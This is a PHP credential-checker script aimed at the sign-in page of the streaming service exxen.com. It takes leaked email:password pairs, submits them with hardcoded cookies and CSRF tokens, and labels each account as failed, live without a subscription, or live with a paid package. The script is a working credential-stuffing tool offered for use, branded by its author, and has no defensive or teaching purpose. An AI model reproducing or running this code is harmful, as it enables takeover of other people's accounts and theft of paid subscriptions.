<?php

error_reporting(0);

function multiexplode($delimiters, $string) {
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$user = multiexplode(array(":", "|", ""), $lista)[0];
$pass = multiexplode(array(":", "|", ""), $lista)[1];



function getStr2($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.exxen.com/tr/sign-in');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36',
'Content-Type: application/x-www-form-urlencoded',
'Origin: null',
'Host: www.exxen.com',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'Cookie: lang=tr;_gcl_au=1.1.1917983329.1644163673;_fbp=fb.1.1644163673591.1335567572;__gads=ID=f27fe9cd4e2a3132:T=1644163675:S=ALNI_Ma-TRg-OnGiIGHFz4jZ08M-2z511g;csrf=CfDJ8NcCk1KZH8RJj2Q__o3Br67BmmNwXeL8fJki2CuPB1uf-7qvf4leANukScosKTRSY0k4FHTaZpsp_TTdCQjgF19Jbd0DWQFDSNPAT1S-smRMiqC77RE8O2DpPDf0lIvmhdqWs6aNkjNFFYn5iYPH4_E;_ga=GA1.2.2034633140.1644163675;_gid=GA1.2.60985375.1644163680;_gat_gtag_UA_178754910_1=1;cto_bundle=2AFGVl84V2Y4WlBjWkdMWUhIdVBidkdLWnUxZzVOeE1ucnV1OENvMWZhY0NSSzlmJTJGWkl3RWZBZml2U2NIYmpndGZHQXFSMGdtUHZxOThwSkZpNDRzVFhEZXkwaCUyRk9tSEdxJTJCU2IlMkJWNkJHekc4U1FueU5sTHdIOG1pJTJCaWZrcndTeEglMkIxMEN5Vjg5eWJQMXBDanlxbG03VURRZnclM0QlM0Q'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  '__RequestVerificationToken=CfDJ8NcCk1KZH8RJj2Q__o3Br6499F0EgmEKpmTZmR6L2d8qFiYvJISGQpQWfJ-eLehiSH2nvywVsC8JZfGJnEHw8c6uPgGJKL4R1jHDANTpIyJcO29eC-rJAl-RIqzrwDXrZCkWGZCAQ0qjnpbz3jRa_P4&__reCAPTCHAVerificationToken=&returnUrl=&Email='.$user.'&Password='.$pass.'&RememberMe=true');
$fcb = curl_exec($ch);
////////////////////////////===[Card Response]

if (strpos($fcb, 'belirleyebilirsiniz.')) {
  echo '<span class="badge badge-danger">💀Başarısız💀</span> '.$user.':'.$pass.' <b> 🔴 Hatalı 🔴 ♛DeltaMedya.Tk♛ </b>';
}
else if (strpos($fcb, 'tekrar')) {
  echo '<span class="badge badge-danger">💀Başarısız💀</span> '.$user.':'.$pass.' <b> 🔴 Hatalı 🔴 ♛DeltaMedya.Tk♛ </b>';
}
else if (strpos($fcb, 'Error_CRM_Popup_Text_ErrorCode_102101')) {
  echo '<span class="badge badge-danger">💀Başarısız💀</span> '.$user.':'.$pass.' <b> 🔴 Hatalı 🔴 ♛DeltaMedya.Tk♛ </b>';
}
 else {
  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.exxen.com/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36',
'Content-Type: application/x-www-form-urlencoded',
'Host: www.exxen.com',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7,az;q=0.6,id;q=0.5',
'cache-control: max-age=0',
'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98',

'sec-fetch-user: ?1'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  '');
$fcb2 = curl_exec($ch);
if (strpos($fcb2, 'bir')) {

  echo '<span class="badge badge-success">#Onaylandı</span> '.$user.':'.$pass.' <b> ❤Live❤ ⚠️ Paketsiz Hesap ⚠️♛DeltaMedya.Tk♛ </b>';
}
 else {
 	echo '<span class="badge badge-success">#Onaylandı</span> '.$user.':'.$pass.' <b> ❤Live❤ 📦 Paketli Hesap 📦 ♛DeltaMedya.Tk♛ </b>';
}}
curl_close($ch);
ob_flush();

//////////////////////////////////////////////CHECKER MADE BY MR BLUE STRANGER 560
?>
